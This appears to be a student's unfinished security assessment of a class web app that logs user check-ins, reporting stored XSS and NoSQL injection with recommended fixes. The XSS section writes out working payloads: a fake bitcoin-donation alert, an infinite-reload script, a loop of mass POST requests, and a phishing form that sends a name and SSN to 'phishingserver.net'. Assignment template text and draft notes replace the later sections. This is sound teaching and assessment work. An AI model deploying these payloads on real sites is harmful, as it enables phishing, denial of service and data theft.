<!DOCTYPE html>
<html>
<head>
	<title>Lab 13</title>
	<link rel="stylesheet" href="style.css" type="text/css" />
</head>
<body>
	<h1>Assignment 4: Security and Privacy Assessment of a Web Application</h1>
	<h2> Introduction </h2>
		<p>The product that is being tested here is "Not Foursquare." It is basically a tool where users can check in and log their coordinates, and accessing the main page yields all of the people who have checked in and their coordinates. The users login name and coordinates are stored in a connected database.</p>
		<p>It is my duty to examine the security of this web service. It is unclear whether the site was intended to allow only certain users to log their coordinates or to allow everyone to log their coordinates, but the security analysis will examine both use cases.</p>
	<h2> Methodology </h2>
		<p>The methodology used was primarily "white box" testing, where the source code was examined for vulnerabilities before attempting to test them on the actual service. This was done because when starting I did not know where to start or how to go about "black box" testing. The tools eventually used to test the security of the web application were curl, Postman, Google Chrome, and a bash shell script. </p>
	<h2>Abstract of Findings </h2>
	 	<p>The web application has numerous security issues that could affect stability of the service, user experience, user's browser security, and potentially data security. The main offenders are as follows:</p>
	 	<ol>
	 		<li>Malicious user input is allowed and is sent back to every clients browser upon a refresh, which can lead to:
	 			<ul>
	 				<li>Altering the content of the webpage</li>
	 				<li>Phishing attempts with phony forms</li>
	 				<li>Redirecting the user to another website</li>
	 				<li>Making the website inaccessible or unusable</li>
	 				<li>Crashing the user's browser</li>
	 				<li>Accessing cookies containing personal data if they are ever implemented</li>
	 			</ul>
 			</li> 
	 		<li>All of the data in the databse collection is accessable in an easily usable form via an injection attack at one of the separate </li>
	 		<li>The database can be flooded and potentially have its resources consumed by repeated logging</li>
	 	</ol>
	<h2>Issues Found </h2>
		<h4>Cross Site Scripting (XSS)</h4>
			<p>Cross site scripting is possible as user input is not validated sufficiently. Malicious input can be posted and it is then later on echoed back to client. It is of fairly high severity, as it can mangle the webpage, make it inoperable, or attempt to manipulate the end user. This vulnerability exists in the main Javscript file at the location in the picture below. As one can see, the login variable is taken directly from user input, and is only checked to make sure it is not undefined. This becomes a problem when the script echoes back the list of logins later on, as someone can insert whatever javascript or html they want in this field, and it will later execute on the clients browser.</p>
			<img src="Location_1.png" alt="First vulnerability location" id="scale_picture_50">
			<p>As an example, posting to the website at the /sendLocation route with:  &ltimg src="https://pics.onsizzle.com/hacker-voice-im-in-9461453.png" alt="hacker doggo" width=500 height=384&gt in the login field yielded the picture below being placed on the webpage. </p>
			<img src="Inserting_picture.png" alt="dog meme inserted" id="scale_picture_30">
			<p> More sinister examples include posting things such as:</p>
			<ul>
				<li>&ltscript&gtalert("Hello! Your data is unsecure. Please send a donation in bitcoin to the water foundation at the address 1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R to make your data secure again!") &lt/script&gt<br><img src="Phony_Alert.png" alt="phony alert" id="scale_picture_50"><br><br></li>
				<li>&ltscript&gtwhile(1){location.reload(true)}&lt/script&gt  This makes the page hang and never load:<br><img src="Not_loading.png" alt="page hanging" id="scale_picture_40"><br><br></li>
				<li>Picture same as the above example, but many POSTS are made. Could be made infinite loop, and every person trying to access page would be posting a ton, which becomes sort of a psuedo DDOS.<br> &ltscript&gtfor (i = 0; i &lt 10000; i++) { var http = new XMLHttpRequest();
					var url = "http://localhost:3000/sendLocation"; <br>
					var params = "login=crashtestdummies&lat=12&lng=12"; <br>
					http.open("POST", url, true); <br>
					http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); <br>
					http.onreadystatechange = function() { <br>
					if(http.readyState == 4 && http.status == 200) { <br>
					console.log("readystatechange!"); }}<br>
					http.send(params); <br>
					console.log("request sent!")}&lt/script&gt <br><br></li>
				<li>&ltform action="http://phishingserver.net" method="post"&gt &ltlabel for="name"&gtPlease enter your name:  &lt/label&gt&ltinput name="name" id="name" value="JohnDoe7"&gt&ltbr&gt&ltlabel for="SSN"&gt Please enter your social security number:  &lt/label&gt&ltinput name="SSN" value="0000000"&gt &ltbr&gt &ltbutton&gtContinue Logging In!&lt/button>&lt/form&gt<br><img src="Phishing.png" alt="Phishing form" id="scale_picture_40"></li>
				<li>Redirects can be done in various ways, which can happen on page load etc. This mimics another security issue of Unvalidated Redirects/Forwards.</li>
			</ul>
			<p>The other fields are more thoroughly checked for validity, and they appear to be secure. There are a few paths to resolve the issue with the insecure field that is the echoed back. </p>
			<p>If the application operator wants the ideal solution that limits posting to only authorized users rather than everyone, they could add a separate user authorization process where users register a login that is thoroughly validated (could also use a password or api key instead of login). This login would be stored in a separate database (or hashes of the login/password combos could be stored etc), which could then be referenced every time someone tries to post to the server at the /sendLocation path. This approach would have the benefit that the headers could be set selectively (ie Access-Control-Allow-Origin is set differently for each request if you have a valid login rather than using the wildcard '*').</p> 
			<p>If the operator wants everyone to have the ability to post their locations, then at a bare minimum, the login key value pair needs to be validated more thoroughly, via escaping characters, or limiting the value of login to alphanumeric characters only.</p>

		<h4>Injection Vulnerability - All data accessible</h4>
			<p> This issue is that there is the ability to perform injections on the noSQL database underlying the Not Foursquare platform. In this use case it is only of moderate severity, as I was only able to exposes all of the data in the collection on the database, which was already public, but I believe someone more skilled could execute other javascript commands on the databse. I found this by looking for places where something was done with user input with little or no validation. The problem can be examined in the picture below. As one can see, user input is used more or less unfiltered in performing a query on the database via collection.find(). Changing the loginEntry variable by modifying the query string on the GET request allows the user to cause unintended behavior.</p>
			<img src="Location2.png" alt="Second vulnerability location" id="scale_picture_50">
			<p> This path is normally intended to allow users to search for specific things in the database. However, by searching for results that are not equal to something that is not in the database, we gain access to everything in the collection (see picture below). This would yield problems if there were sensitive data in the collection, or if only certain information in the collection were public, as everything in the collection would be exposed.</p>
			<img src="Injection.png" alt="Injection example" id="scale_picture_50">
			<p></p>
		<h4>Attacking The Database</h4>
		Psuedo Cross Site Request Forgery
		<h4>Other Issues</h4>

		For each issue that you find, document:
		Issue (e.g., database injection, really bad programming practice)
		Location / page where issue was found
		Severity of issue (e.g., low, medium , or high). Justify your answer.
		Description of issue. How did you find it? A screenshot of problem is excellent.
		Proof of vulnerability. Screenshots are important.
		Resolution. Make recommendation(s) on how issue can be resolved. Show code if possible.
	<h2>Conclusion </h2>
		You can also list future considerations and recommendations with costs.




prevents one website from using cookies to be able to make requests to another site using your credentials
other websites can make post requests and view results rather than just users on this webpage
not enough verification on "login term", 
</body>
</html>